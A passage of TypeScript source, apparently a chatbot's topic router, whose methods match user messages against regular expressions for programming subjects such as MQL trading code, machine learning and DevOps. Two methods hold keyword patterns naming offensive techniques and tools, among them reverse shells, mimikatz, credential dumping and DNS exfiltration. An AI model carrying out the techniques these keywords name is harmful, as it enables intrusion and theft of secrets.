    const functionPattern = /\b(OnInit|OnDeinit|OnTick|OnCalculate|OnTester|OnTimer|OnChartEvent|OrderSend|OrderModify|OrderClose|iMA\(|iRSI\(|iMACD\(|ta\.sma|ta\.ema|ta\.rsi|ta\.macd|ta\.bb|ta\.atr|ta\.crossover|ta\.crossunder|strategy\.entry|strategy\.exit|strategy\.close|CopyBuffer|SetIndexBuffer|PlotIndexSet|request\.security)\b/i
    return platformPattern.test(msg) || conceptPattern.test(msg) || functionPattern.test(msg)
  }

  /** Check if query is about MQL error codes and debugging. */
  private isMqlErrorsDebuggingQuery(msg: string): boolean {
    const errorPattern = /\b(mql[45]?\s+(error|debug|getlasterror|lasterror|retcode)|mt[45]\s+(error|debug|compilation\s+error|build\s+error|syntax\s+error)|trade\s+result\s+code|TRADE_RETCODE)\b/i
    const fixPattern = /\b(mql\s+(fix|solve|resolve)\s+(error|bug|issue|problem)|compile\s+(error|fail|fix)\s+mql|metatrader\s+(error|debug|fix)|ordersend\s+(error|fail|return))\b/i
    const debugPattern = /\b(mql\s+(print|comment|alert|debugbreak|log)|ea\s+(error|debug|crash|not\s+working)|indicator\s+(error|not\s+showing|blank|wrong))\b/i
    return errorPattern.test(msg) || fixPattern.test(msg) || debugPattern.test(msg)
  }

  /** Check if query is about EA development patterns. */
  private isEaDevelopmentPatternsQuery(msg: string): boolean {
    const templatePattern = /\b(ea\s+(template|structure|pattern|architecture|framework|boilerplate|skeleton)|expert\s+advisor\s+(template|structure|pattern|design|framework))\b/i
    const patternPattern = /\b(ea\s+(state\s+machine|multi\s+timeframe|event\s+driven|retry|error\s+recovery|logging|journal)|trading\s+(state\s+machine|design\s+pattern)|grid\s+ea|martingale\s+(ea|pattern|code))\b/i
    const practicePattern = /\b(robust\s+ea|ea\s+(best\s+practice|testing|debugging|log)|mql\s+(state\s+machine|design\s+pattern|architecture))\b/i
    return templatePattern.test(msg) || patternPattern.test(msg) || practicePattern.test(msg)
  }

  /** Check if query is about advanced indicator development. */
  private isAdvancedIndicatorDevQuery(msg: string): boolean {
    const indicatorPattern = /\b(multi\s+timeframe\s+indicator|mtf\s+indicator|arrow\s+indicator|signal\s+indicator|dashboard\s+indicator|histogram\s+indicator)\b/i
    const repaintPattern = /\b(indicator\s+repaint|repainting\s+(fix|issue|problem|avoid)|non.repainting\s+indicator|bar\s+confirmation\s+indicator)\b/i
    const displayPattern = /\b(indicator\s+(separate\s+window|chart\s+window|overlay|display\s+type)|draw_(line|arrow|histogram|candles|filling|color)|channel\s+indicator\s+(mql|code)|band\s+indicator\s+(mql|code))\b/i
    return indicatorPattern.test(msg) || repaintPattern.test(msg) || displayPattern.test(msg)
  }

  /** Check if query is about MQL code optimization. */
  private isMqlCodeOptimizationQuery(msg: string): boolean {
    const perfPattern = /\b(mql\s+(optimization|performance|speed|fast|slow|efficient)|ea\s+(slow|fast|optimization|performance)|metatrader\s+(performance|speed|optimization))\b/i
    const codePattern = /\b(mql\s+(array|string|loop|memory|preprocessor|include|organize|structure)|arrayresize|arrayset|arraysetasseries|stringconcatenate|stringformat)\b/i
    const orgPattern = /\b(mql\s+(code\s+organization|file\s+structure|conditional\s+compilation)|#ifdef\s+__MQL[45]__|#property\s+strict|sinput|input\s+group)\b/i
    return perfPattern.test(msg) || codePattern.test(msg) || orgPattern.test(msg)
  }

  /** Check if query is about MT4 to MT5 migration. */
  private isMt4Mt5MigrationQuery(msg: string): boolean {
    const migratePattern = /\b(mt4\s+to\s+mt5|mql4\s+to\s+mql5|convert\s+(ea|indicator|script)\s+mt[45]|migration\s+(mt4|mt5|mql4|mql5)|migrate\s+(mt4|mt5|mql4|mql5))\b/i
    const diffPattern = /\b(mt4\s+mt5\s+difference|mql4\s+mql5\s+(api|function|difference|mapping)|cross.platform\s+mql|universal\s+ea|mql\s+wrapper)\b/i
    const pitfallPattern = /\b(mt4\s+mt5\s+(pitfall|gotcha|issue|problem)|mql4\s+deprecated|arraysetasseries\s+migration)\b/i
    return migratePattern.test(msg) || diffPattern.test(msg) || pitfallPattern.test(msg)
  }

  /** Check if query is about advanced EA features. */
  private isAdvancedEaFeaturesQuery(msg: string): boolean {
    const tradePattern = /\b(trailing\s+stop\s+(mql|code|ea|expert)|breakeven\s+(stop|sl|code|mql)|partial\s+close\s+(order|mql|code|ea)|step\s+trailing|chandelier\s+exit\s+code)\b/i
    const filterPattern = /\b(news\s+filter\s+(ea|mql|code)|session\s+filter\s+(ea|mql|code)|spread\s+filter\s+(ea|mql|code)|time\s+filter\s+(ea|mql|code)|day\s+filter\s+(ea|mql|trade))\b/i
    const dashPattern = /\b(ea\s+(dashboard|panel|hud|display|gui)|mql\s+(graphical\s+interface|panel|dashboard|gui|button|label)|objectcreate\s+(label|rectangle|button)|cappDialog)\b/i
    return tradePattern.test(msg) || filterPattern.test(msg) || dashPattern.test(msg)
  }

  /** Check if query is about MQL syntax mistakes and fixes. */
  private isMqlSyntaxMistakesQuery(msg: string): boolean {
    const mistakePattern = /\b(mql\s+(mistake|common\s+error|pitfall|beginner\s+error|bug|coding\s+error)|ea\s+(common\s+bug|mistake|not\s+working|problem))\b/i
    const typePattern = /\b(mql\s+(type\s+conversion|implicit\s+conversion|variable\s+scope|array\s+error|string\s+error)|normalizedouble|mode_stoplevel|5.digit\s+broker)\b/i
    const brokerPattern = /\b(trade\s+context\s+busy|requote\s+(handling|error|fix)|slippage\s+(handling|code)|invalid\s+stops\s+(error|fix)|error\s+(130|131|134|138|146))\b/i
    return mistakePattern.test(msg) || typePattern.test(msg) || brokerPattern.test(msg)
  }

  /** Check if query is about trading code templates. */
  private isTradingCodeTemplatesQuery(msg: string): boolean {
    const templatePattern = /\b(ea\s+template\s+(mql4|mql5|code)|expert\s+advisor\s+(template|boilerplate|starter)|mql[45]\s+(template|boilerplate|starter))\b/i
    const indicatorTemplate = /\b(indicator\s+template\s+(mql4|mql5|code)|custom\s+indicator\s+(template|boilerplate|starter)|mql[45]\s+indicator\s+template)\b/i
    const codePattern = /\b(trading\s+code\s+template|mql\s+(code\s+example|code\s+sample|starter\s+code|boilerplate)|ea\s+code\s+template|indicator\s+code\s+template)\b/i
    return templatePattern.test(msg) || indicatorTemplate.test(msg) || codePattern.test(msg)
  }

  /** Check if query is about MQL order types and execution. */
  private isMqlOrderTypesQuery(msg: string): boolean {
    const orderPattern = /\b(mql[45]?\s+(order\s+types?|pending\s+order|market\s+order|ordersend|buy\s+limit|sell\s+limit|buy\s+stop|sell\s+stop)|mt[45]\s+(order\s+type|pending\s+order|execution))\b/i
    const execPattern = /\b(ecn\s+(broker\s+)?execution|market\s+execution\s+mode|instant\s+execution|mql\s+(netting|hedging)\s+mode|position\s+vs\s+order\s+vs\s+deal)\b/i
    const poolPattern = /\b(order\s+pool\s+iteration|order\s+loop\s+management|close\s+all\s+orders|scan\s+open\s+(orders|positions)|orders\s*total\s+loop)\b/i
    return orderPattern.test(msg) || execPattern.test(msg) || poolPattern.test(msg)
  }

  /** Check if query is about MQL money management and lot sizing. */
  private isMqlMoneyManagementQuery(msg: string): boolean {
    const lotPattern = /\b(mql[45]?\s+(lot\s+size|lot\s+calculation|position\s+sizing|money\s+management)|mt[45]\s+(lot\s+calculator|risk\s+per\s+trade|money\s+management))\b/i
    const riskPattern = /\b(risk\s+per(cent|\s+trade)\s+(mql|ea|mt[45])|mql\s+(drawdown|equity)\s+(control|protection|limit)|daily\s+loss\s+limit\s+ea)\b/i
    const equityPattern = /\b(account\s*(balance|equity|margin)\s+(check|calculation|mql)|lot\s+step\s+normali[sz]|minlot\s+maxlot|mql\s+compound\s+growth)\b/i
    return lotPattern.test(msg) || riskPattern.test(msg) || equityPattern.test(msg)
  }

  /** Check if query is about MQL chart objects and GUI programming. */
  private isMqlChartObjectsQuery(msg: string): boolean {
    const objPattern = /\b(mql[45]?\s+(chart\s+object|graphical\s+object|objectcreate|draw\s+(line|rectangle|text|arrow))|mt[45]\s+(chart\s+object|draw\s+on\s+chart))\b/i
    const guiPattern = /\b(mql[45]?\s+(button|panel|gui|dashboard|interactive)|obj_(button|label|edit|rectangle_label|bitmap)|onchartevent\s+(click|button))\b/i
    const canvasPattern = /\b(mql5\s+(canvas|cgraphic|cappd?ialog)|ccanvas\s+(draw|pixel|bitmap)|mql\s+(custom\s+panel|trade\s+panel|info\s+panel))\b/i
    return objPattern.test(msg) || guiPattern.test(msg) || canvasPattern.test(msg)
  }

  /** Check if query is about MQL file I/O operations. */
  private isMqlFileOperationsQuery(msg: string): boolean {
    const filePattern = /\b(mql[45]?\s+(file\s+(read|write|open|operations?|csv)|fileopen|filewrite|fileread)|mt[45]\s+(file\s+operations?|csv\s+export|trade\s+log\s+file))\b/i
    const dbPattern = /\b(mql5?\s+(sqlite|database|databaseopen)|mt5\s+(database|sqlite|data\s+storage)|mql\s+sql\s+query)\b/i
    const statePattern = /\b(mql\s+(persistent|save|load)\s+(state|settings?|config)|global\s*variable\s*(set|get|check)\s+mql|ea\s+(save|restore)\s+state)\b/i
    return filePattern.test(msg) || dbPattern.test(msg) || statePattern.test(msg)
  }

  /** Check if query is about MQL network/web operations. */
  private isMqlNetworkWebQuery(msg: string): boolean {
    const webPattern = /\b(mql[45]?\s+(webrequest|http\s+(get|post|api)|telegram\s+(bot|notification|send)|webhook)|mt[45]\s+(web\s+request|http|api\s+call))\b/i
    const socketPattern = /\b(mql5?\s+(socket|socketcreate|socketconnect)|mt5\s+(socket|tcp\s+connect)|mql\s+(rest\s+api|json\s+pars))\b/i
    const copyPattern = /\b(mql\s+(copy\s+trading|signal\s+provider|named\s+pipe|shared\s+memory)|mt[45]\s+(copy\s+trade|multi\s+terminal\s+sync)|ea\s+communication\s+between)\b/i
    return webPattern.test(msg) || socketPattern.test(msg) || copyPattern.test(msg)
  }

  /** Check if query is about MQL strategy patterns (grid, scalping, hedging). */
  private isMqlStrategyPatternsQuery(msg: string): boolean {
    const gridPattern = /\b(mql[45]?\s+(grid\s+(trading|bot|ea|strategy)|martingale\s+(ea|code|system))|mt[45]\s+(grid\s+ea|grid\s+trading))\b/i
    const scalpPattern = /\b(mql[45]?\s+(scalp|scalping|high\s+frequency|tick\s+scalp)|mt[45]\s+(scalp|scalping)\s+(ea|strategy|bot)|fast\s+execution\s+ea)\b/i
    const hedgePattern = /\b(mql[45]?\s+(hedg|hedge\s+strategy|news\s+trading\s+(ea|code)|anti.martingale)|mt[45]\s+(hedg|basket\s+trading|pyramid))\b/i
    return gridPattern.test(msg) || scalpPattern.test(msg) || hedgePattern.test(msg)
  }

  /** Check if query is about MQL indicator mathematical formulas. */
  private isMqlIndicatorFormulasQuery(msg: string): boolean {
    const maPattern = /\b(mql[45]?\s+(ema|sma|wma|moving\s+average)\s+(formula|calculation|code|math)|custom\s+(ema|sma|wma|moving\s+average)\s+(code|formula)\s+mql|hull\s+ma\s+mql|kama\s+mql)\b/i
    const oscPattern = /\b(mql[45]?\s+(rsi|macd|stochastic|cci|momentum)\s+(formula|calculation|code|math)|custom\s+(rsi|macd|stochastic)\s+(code|formula)\s+mql)\b/i
    const bandPattern = /\b(mql[45]?\s+(bollinger|atr|keltner|donchian|ichimoku)\s+(formula|calculation|code|math)|(bollinger|atr|keltner|ichimoku)\s+(formula|math)\s+mql)\b/i
    return maPattern.test(msg) || oscPattern.test(msg) || bandPattern.test(msg)
  }

  /** Check if query is about MQL testing and code quality. */
  private isMqlTestingQualityQuery(msg: string): boolean {
    const testerPattern = /\b(mql[45]?\s+(strategy\s+tester|backtest|optimization|walk.forward)|mt[45]\s+(strategy\s+tester|backtest|optimi[sz]|every\s+tick))\b/i
    const qualityPattern = /\b(mql[45]?\s+(code\s+quality|best\s+practice|coding\s+standard|clean\s+code|review\s+checklist)|mt[45]\s+(code\s+quality|best\s+practice))\b/i
    const cloudPattern = /\b(mql5\s+cloud\s+network|mt5\s+(cloud|distributed)\s+optimi|ontester\s+custom\s+criterion|mql\s+profit\s+factor\s+sharpe)\b/i
    return testerPattern.test(msg) || qualityPattern.test(msg) || cloudPattern.test(msg)
  }

  /** Check if query is about exploit development / binary exploitation. */
  private isExploitDevelopmentQuery(msg: string): boolean {
    const exploitPattern = /\b(exploit\s+dev|exploit\s+development|binary\s+exploit|pwn|offensive\s+security|vulnerability\s+research|post.exploitation|anti.forensic)\b/i
    const techniquePattern = /\b(buffer\s+overflow|stack\s+overflow|heap\s+overflow|format\s+string\s+(vuln|attack|bug|exploit|test)|rop\s+chain|rop\s+gadget|return.oriented\s+programming|ret2libc|ret2plt|ret2csu|sigreturn|shellcode\s+(encod|decod|obfuscat)|bad\s+char|bad\s+byte|badchar|cyclic\s+pattern|pattern[_\s]create|pattern[_\s]offset|de\s+bruijn|nop\s+sled|stack\s+pivot|heap\s+spray|use.after.free|double\s+free|integer\s+overflow|off.by.one|got\s+overwrite|plt.got|one.gadget|stack\s+canary\s+bypass|aslr\s+bypass|dep\s+bypass|nx\s+bypass|pie\s+bypass|reverse\s+shell|bind\s+shell|meterpreter|python\s+backdoor|token\s+impersonation|pass.the.hash|pass.the.ticket|mimikatz|credential\s+dump|password\s+dump|lsass\s+dump|registry\s+manipulation|suid\s+(enum|priv|binary)|cron\s+job\s+abuse|persistence\s+(mechanism|startup|cron|registry)|data\s+exfiltration|dns\s+(exfil|tunnel)|icmp\s+exfil|covert\s+channel|kerberoast|kerberos\s+ticket|ldap\s+enum|bloodhound|sharphound|smb\s+(share\s+)?enum|smbmap|payload\s+obfuscat|process\s+hollowing|dll\s+injection|reflective\s+dll|log\s+clear|log\s+tamper|timestomp|polymorphic\s+(shellcode|payload)|base64\s+payload|xor\s+payload)\b/i
    const toolPattern = /\b(pwntools|pwndbg|gef|ropper|ropgadget|checksec|msfvenom|mona\.py|boofuzz|afl\+?\+?|libfuzzer|honggfuzz|radamsa|peach\s+fuzzer|fuzzing\s+framework|impacket|secretsdump|pypykatz|crackmapexec|rubeus|smbclient|enum4linux|dnscat2|iodine|cobalt\s+strike|metasploit|empire|pupy)\b/i
    return exploitPattern.test(msg) || techniquePattern.test(msg) || toolPattern.test(msg)
  }

  /** Check if query is about Python network security programming (Black Hat Python). */
  private isNetworkSecurityPythonQuery(msg: string): boolean {
    const networkPattern = /\b(python\s+(socket|tcp|udp|raw\s+socket|packet|sniffer|network\s+scan|port\s+scan|proxy)|paramiko|scapy|kamene|black\s+hat\s+python)\b/i
    const techniquePattern = /\b(arp\s+(spoof|poison)|packet\s+(craft|sniff|capture)|web\s+(directory|content)\s+(brut|enum)|burp\s+(suite|extension|proxy)\s+python|git\s+(trojan|c2|command\s+and\s+control)|credential\s+sniff|man\s+in\s+the\s+(middle|browser)\s+python|sandbox\s+detect|code\s+inject\s+python|dll\s+inject\s+python|process\s+monitor\s+python|keylog\s+python)\b/i
    const toolPattern = /\b(bhnet|netcat\s+python|python\s+netcat|wmi\s+python|ctypes\s+network|struct\s+(pack|unpack)\s+network|image\s+carv|opencv\s+network|pyautogui\s+capture|pyhook\s+keylog)\b/i
    return networkPattern.test(msg) || techniquePattern.test(msg) || toolPattern.test(msg)
  }

  /** Check if query is about data science or machine learning. */
  private isDataScienceMLQuery(msg: string): boolean {
    const mlPattern = /\b(machine\s+learning|deep\s+learning|neural\s+network|supervised\s+learning|unsupervised\s+learning|reinforcement\s+learning|gradient\s+(boosting|descent)|backpropagation)\b/i
    const modelPattern = /\b(random\s+forest|decision\s+tree|logistic\s+regression|svm\s+classifier|k-?means|dbscan|pca\s+dimension|xgboost|lightgbm|catboost)\b/i
    const dlPattern = /\b(cnn\s+(image|classification)|convolutional\s+neural|recurrent\s+neural|lstm\s+network|transformer\s+model|bert\s+(model|fine-?tune)|gpt\s+model|attention\s+mechanism|diffusion\s+model|gan\s+generat|variational\s+autoencoder)\b/i
    const toolPattern = /\b(sklearn|scikit-?learn|pytorch\s+model|tensorflow\s+(model|keras)|pandas\s+dataframe|numpy\s+array|feature\s+engineering|hyperparameter\s+tun|time\s+series\s+forecast|arima\s+model|prophet\s+forecast)\b/i
    return mlPattern.test(msg) || modelPattern.test(msg) || dlPattern.test(msg) || toolPattern.test(msg)
  }

  /** Check if query is about cloud computing or DevOps. */
  private isCloudDevOpsQuery(msg: string): boolean {
    const containerPattern = /\b(docker\s+(container|image|compose|build|file)|kubernetes\s+(pod|deployment|service|cluster)|k8s\s+(deploy|pod|service)|helm\s+chart|kubectl)\b/i
    const cicdPattern = /\b(ci\s*\/?\s*cd\s+pipeline|github\s+actions\s+workflow|jenkins\s+pipeline|gitlab\s+ci|continuous\s+(integration|deployment|delivery)\s+pipeline)\b/i
    const iacPattern = /\b(terraform\s+(module|provider|plan|apply)|ansible\s+(playbook|role)|infrastructure\s+as\s+code|pulumi\s+stack|cloudformation\s+template)\b/i
    const cloudPattern = /\b(aws\s+(lambda|ec2|s3|ecs|eks|fargate|dynamodb)|prometheus\s+grafana|observability\s+stack|service\s+mesh\s+istio|gitops\s+argocd|argocd\s+sync)\b/i
    return containerPattern.test(msg) || cicdPattern.test(msg) || iacPattern.test(msg) || cloudPattern.test(msg)
  }

  /** Check if query is about mobile app development. */
  private isMobileDevelopmentQuery(msg: string): boolean {
    const frameworkPattern = /\b(react\s+native\s+(app|component|navigation|expo)|flutter\s+(widget|dart|app|material)|expo\s+(app|build|router|update))\b/i
    const nativePattern = /\b(swiftui\s+(view|state|binding)|uikit\s+(controller|tableview)|ios\s+(app|development)\s+(swift|xcode)|jetpack\s+compose\s+(ui|android)|kotlin\s+android\s+(app|development)|android\s+jetpack)\b/i
    const mobilePattern = /\b(mobile\s+app\s+(development|testing|deployment|state|push)|app\s+store\s+(submission|review|connect)|google\s+play\s+(console|upload)|fastlane\s+(build|deploy|match)|codepush|eas\s+build)\b/i
    return frameworkPattern.test(msg) || nativePattern.test(msg) || mobilePattern.test(msg)
  }

  /** Check if query is about blockchain or Web3 development. */
  private isBlockchainWeb3Query(msg: string): boolean {
    const solidityPattern = /\b(solidity\s+(contract|function|mapping|modifier|event)|smart\s+contract\s+(develop|deploy|audit|security)|erc-?(20|721|1155)\s+token|openzeppelin\s+contract)\b/i
    const defiPattern = /\b(defi\s+(protocol|lending|yield|liquidity)|decentralized\s+(exchange|finance)|amm\s+pool|flash\s+loan|yield\s+farm|liquidity\s+pool|impermanent\s+loss)\b/i
    const web3Pattern = /\b(web3\s+(dapp|development|frontend)|ethers\.js|wagmi\s+hook|metamask\s+connect|hardhat\s+(test|deploy)|foundry\s+forge|nft\s+(mint|marketplace|metadata)|layer\s+2\s+(scaling|rollup)|zk-?rollup|optimistic\s+rollup)\b/i
    return solidityPattern.test(msg) || defiPattern.test(msg) || web3Pattern.test(msg)
  }

  /** Check if query is about system design and architecture. */
  private isSystemDesignQuery(msg: string): boolean {
    const infraPattern = /\b(load\s+balanc(er|ing)\s+(algorithm|design|nginx)|caching\s+strateg(y|ies)\s+(redis|memcached)|cache\s+(invalidation|aside|through|back)|distributed\s+cach(e|ing))\b/i
    const dbPattern = /\b(database\s+(sharding|replication|partitioning|scaling)|sql\s+vs\s+nosql|cap\s+theorem|read\s+replica|consistent\s+hashing)\b/i
    const systemPattern = /\b(message\s+queue\s+(kafka|rabbitmq)|rate\s+limit(er|ing)\s+(algorithm|token\s+bucket)|system\s+design\s+(interview|scalab|architect)|consensus\s+algorithm|raft\s+consensus|distributed\s+system\s+(design|fundamentals))\b/i
    const designPattern = /\b(design\s+(url\s+shortener|twitter|chat\s+system|notification)|microservic(e|es)\s+architect|event\s+driven\s+architect|api\s+gateway\s+design)\b/i
    return infraPattern.test(msg) || dbPattern.test(msg) || systemPattern.test(msg) || designPattern.test(msg)
  }

  /** Check if query is about compiler or programming language design. */
  private isCompilerLanguageDesignQuery(msg: string): boolean {
    const lexerPattern = /\b(lexer\s+(implement|token|scan)|lexical\s+analysis|tokenizer\s+(implement|design)|scanner\s+(implement|finite\s+automata))\b/i
    const parserPattern = /\b(parser\s+(implement|recursive|descent|generator)|parsing\s+(algorithm|strategy|technique)|abstract\s+syntax\s+tree|ast\s+(node|generat|transform)|cfg\s+grammar|context-?free\s+grammar|antlr\s+grammar|yacc|bison\s+parser)\b/i
    const compilerPattern = /\b(type\s+system\s+(design|check|infer)|hindley-?milner|llvm\s+(ir|backend|pass)|code\s+generation\s+(backend|optimiz)|compiler\s+(design|implement|optimiz|pass)|garbage\s+collect(or|ion)\s+(algorithm|implement)|virtual\s+machine\s+(design|implement|bytecode)|bytecode\s+(compil|interpret|vm))\b/i
    return lexerPattern.test(msg) || parserPattern.test(msg) || compilerPattern.test(msg)
  }

  /** Check if query is about game development. */
  private isGameDevelopmentQuery(msg: string): boolean {
    const enginePattern = /\b(unity\s+(game|engine|monobehaviour|c#|script|physics|rigidbody)|unreal\s+(engine|blueprint|actor|nanite|lumen|ue[45])|godot\s+(game|engine|gdscript|node|scene))\b/i
    const gamedevPattern = /\b(game\s+(physics|engine|networking|multiplayer|shader|ai\s+pathfind)|entity\s+component\s+system\s+ecs|behavior\s+tree\s+(game|ai)|navmesh\s+pathfind|a-?star\s+(pathfind|algorithm\s+game))\b/i
    const renderPattern = /\b(hlsl\s+shader|glsl\s+shader|vertex\s+fragment\s+shader|pbr\s+(render|material|shader)|game\s+render\s+pipeline|shader\s+(graph|program)\s+game)\b/i
    return enginePattern.test(msg) || gamedevPattern.test(msg) || renderPattern.test(msg)
  }

  /** Check if query is about cybersecurity or penetration testing. */
  private isCybersecurityPentestQuery(msg: string): boolean {
    const pentestPattern = /\b(penetration\s+testing\s+(methodology|phase|oscp)|pentest\s+(reconnaissance|enumeration|exploit)|ethical\s+hacking\s+(methodology|penetration))\b/i
    const webPattern = /\b(owasp\s+top\s+10|sql\s+injection\s+(union|blind|testing)|xss\s+(reflected|stored|dom)|burp\s+suite\s+(scanner|intruder|proxy)|web\s+application\s+security\s+testing)\b/i
    const advancedPattern = /\b(privilege\s+escalation\s+(linux|windows)|wireless\s+security\s+(testing|wifi)|cloud\s+security\s+assessment\s+(aws|azure)|social\s+engineering\s+(phishing|attack)|malware\s+analysis\s+(static|dynamic|reverse))\b/i
    return pentestPattern.test(msg) || webPattern.test(msg) || advancedPattern.test(msg)
  }

  /** Check if query is about database engineering. */
  private isDatabaseEngineeringQuery(msg: string): boolean {
    const pgPattern = /\b(postgresql\s+(index|partition|vacuum|window\s+function|jsonb|cte|explain\s+analyze)|postgres\s+(btree|gin|gist|brin|query\s+optimiz))\b/i
    const nosqlPattern = /\b(redis\s+(data\s+structure|pub.sub|stream|cluster|sentinel|sorted\s+set)|mongodb\s+(aggregation|sharding|replica\s+set|indexing|document))\b/i
    const dbEngPattern = /\b(database\s+(migration|replication|high\s+availability|failover)|schema\s+migration\s+(flyway|liquibase|alembic|prisma)|time\s+series\s+database\s+(influxdb|timescaledb)|distributed\s+sql\s+(cockroachdb|spanner|tidb)|sql\s+query\s+optimization\s+(execution|explain))\b/i
    return pgPattern.test(msg) || nosqlPattern.test(msg) || dbEngPattern.test(msg)
  }

  /** Check if query is about API design or GraphQL. */
  private isApiDesignGraphQLQuery(msg: string): boolean {
    const restPattern = /\b(rest\s+api\s+(design|best\s+practice|versioning|pagination)|restful\s+api\s+(resource|naming|hateoas)|api\s+versioning\s+(strategy|backward\s+compat))\b/i
    const graphqlPattern = /\b(graphql\s+(schema|resolver|mutation|subscription|query|dataloader|federation|n\+1)|apollo\s+(server|federation|client)\s+graphql)\b/i
    const apiPattern = /\b(grpc\s+(protocol\s+buffer|streaming|bidirectional|service)|openapi\s+(swagger|specification|code\s+generation)|api\s+(authentication\s+oauth|security\s+rate\s+limit|gateway\s+routing)|webhook\s+(event|retry|delivery))\b/i
    return restPattern.test(msg) || graphqlPattern.test(msg) || apiPattern.test(msg)
  }

  /** Check if query is about DevSecOps security practices. */
  private isDevSecOpsQuery(msg: string): boolean {
    const sastPattern = /\b(sast\s+(static|tool|scan|security)|static\s+application\s+security\s+testing|sonarqube\s+(scan|security|quality)|semgrep\s+(rule|pattern|scan)|codeql\s+(query|analysis|security))\b/i
    const dastPattern = /\b(dast\s+(dynamic|scan|tool|security)|dynamic\s+application\s+security\s+testing|software\s+composition\s+analysis\s+sca|dependency\s+vulnerability\s+scan|supply\s+chain\s+security\s+sbom)\b/i
    const secopsPattern = /\b(container\s+security\s+(scanning|image|falco|trivy)|secret\s+(management|scanning|vault|rotation)|devsecops\s+(pipeline|ci.cd|shift.left)|iac\s+security\s+(terraform|checkov|tfsec)|vulnerability\s+management\s+(prioritiz|triage|lifecycle))\b/i
    return sastPattern.test(msg) || dastPattern.test(msg) || secopsPattern.test(msg)
  }

  /** Check if query is about quantum computing. */
  private isQuantumComputingQuery(msg: string): boolean {
    const fundamentalPattern = /\b(quantum\s+(computing|qubit|superposition|entanglement|gate|circuit|algorithm)|qubit\s+(bloch|measurement|state|noise))\b/i
    const algorithmPattern = /\b(shor\s+algorithm|grover\s+(algorithm|search)|quantum\s+(fourier|phase\s+estimation|approximate\s+optimiz|variational|error\s+correction|noise\s+mitigation))\b/i
    const toolPattern = /\b(qiskit\s+(quantum|circuit|aer)|cirq\s+(quantum|google)|pennylane\s+(quantum|ml)|post-?quantum\s+cryptograph|quantum\s+resistant\s+(encryption|algorithm)|pqc\s+(nist|kyber|dilithium))\b/i
    return fundamentalPattern.test(msg) || algorithmPattern.test(msg) || toolPattern.test(msg)
  }

  /** Check if query is about embedded systems or IoT. */
  private isEmbeddedIoTQuery(msg: string): boolean {
    const hardwarePattern = /\b(arduino\s+(uno|mega|nano|esp|programming)|esp32\s+(wifi|ble|programming|mqtt)|stm32\s+(hal|arm|cortex|programming)|raspberry\s+pi\s+(pico|gpio|embedded))\b/i
    const protocolPattern = /\b(mqtt\s+(broker|pub.?sub|topic|qos)|i2c\s+(bus|address|sda|scl)|spi\s+(bus|mosi|miso|clock)|uart\s+(serial|baud|rx|tx))\b/i
    const embeddedPattern = /\b(rtos\s+(freertos|zephyr|task|queue)|embedded\s+(linux|system|firmware|programming)|tinyml\s+(model|inference|microcontroller)|iot\s+(sensor|gateway|edge|protocol|device))\b/i
    return hardwarePattern.test(msg) || protocolPattern.test(msg) || embeddedPattern.test(msg)
  }

  /** Check if query is about NLP (natural language processing). */
  private isNLPProcessingQuery(msg: string): boolean {
    const corePattern = /\b(nlp\s+(pipeline|tokeniz|preprocessing|task|model)|named\s+entity\s+recognition\s+(ner|model|spacy)|word\s+embedding\s+(word2vec|glove|fasttext))\b/i
    const modelPattern = /\b(bert\s+(model|fine.?tun|pretrain|embedding)|transformer\s+(language\s+model|nlp|attention)|seq2seq\s+(model|translation|encoder|decoder))\b/i
    const taskPattern = /\b(machine\s+translation\s+(model|neural|bleu)|text\s+(classification|generation|summarization)\s+(nlp|model|bert)|speech\s+recognition\s+(asr|whisper|model)|rag\s+retrieval\s+augmented\s+generation)\b/i
    return corePattern.test(msg) || modelPattern.test(msg) || taskPattern.test(msg)
  }

  /** Check if query is about UI/UX design systems. */
  private isUIUXDesignQuery(msg: string): boolean {
    const designPattern = /\b(design\s+system\s+(component|token|pattern|library)|atomic\s+design\s+(methodology|pattern|atom)|storybook\s+(component|visual|testing|documentation))\b/i
    const a11yPattern = /\b(accessibility\s+(wcag|aria|screen\s+reader|audit|guideline)|wcag\s+(2\.\d|compliance|level|aa|aaa)|aria\s+(role|label|live|describedby))\b/i
    const uxPattern = /\b(responsive\s+design\s+(media|mobile|breakpoint|fluid)|user\s+research\s+(interview|survey|usability|persona)|design\s+token\s+(css|color|typography|theming))\b/i
    return designPattern.test(msg) || a11yPattern.test(msg) || uxPattern.test(msg)
  }

  /** Check if query is about computer networking & protocols. */
  private isNetworkingProtocolsQuery(msg: string): boolean {
    const protocolPattern = /\b(tcp\s+(handshake|connection|congestion|window|protocol)|udp\s+(protocol|datagram|connectionless|socket)|dns\s+(resolution|record|cache|query|server))\b/i
    const routingPattern = /\b(bgp\s+(routing|autonomous|as-?path|peer)|ospf\s+(routing|link.?state|area|dijkstra)|vlan\s+(tagging|trunk|802\.1q|switching))\b/i
    const infraPattern = /\b(vpn\s+(tunnel|ipsec|wireguard|openvpn)|load\s+balancer\s+(nginx|haproxy|layer|algorithm)|cdn\s+(caching|edge|cloudflare|content\s+delivery))\b/i
    return protocolPattern.test(msg) || routingPattern.test(msg) || infraPattern.test(msg)
  }

  /** Check if query is about functional programming. */
  private isFunctionalProgrammingQuery(msg: string): boolean {
    const corePattern = /\b(functional\s+programming\s+(pure|immutab|composit|paradigm)|monad\s+(maybe|either|option|io|bind|flatmap)|algebraic\s+data\s+type\s+(sum|product|pattern|adt))\b/i
    const langPattern = /\b(haskell\s+(type\s+class|monad|lazy|ghc|typeclass)|rust\s+(ownership|borrow\s+checker|lifetime|trait)|elixir\s+(otp|genserver|phoenix|pipe|beam))\b/i
    const reactivePattern = /\b(reactive\s+programming\s+(rxjs|observable|stream|signal)|functional\s+reactive\s+(stream|event|signal|frp)|higher\s+order\s+function\s+(map|filter|reduce|fold))\b/i
    return corePattern.test(msg) || langPattern.test(msg) || reactivePattern.test(msg)
  }

  /** Check if query is about robotics & automation. */
  private isRoboticsAutomationQuery(msg: string): boolean {
    const rosPattern = /\b(ros\s+(node|topic|service|action|navigation|slam)|ros2?\s+(navigation|gazebo|rviz|slam|nav2)|robot\s+operating\s+system\s+(ros|node|topic))\b/i
    const kinematicsPattern = /\b(robot\s+(kinematics|dynamics|motion|trajectory|arm|manipulator)|inverse\s+kinematics\s+(jacobian|analytical|numerical)|moveit\s+(motion|planning|collision|grasp))\b/i
    const automationPattern = /\b(plc\s+(ladder|logic|structured\s+text|programming|scada)|industrial\s+(robot|automation|fanuc|kuka|abb)|drone\s+(uav|autonomous|flight|ardupilot|px4|mavlink))\b/i
    return rosPattern.test(msg) || kinematicsPattern.test(msg) || automationPattern.test(msg)
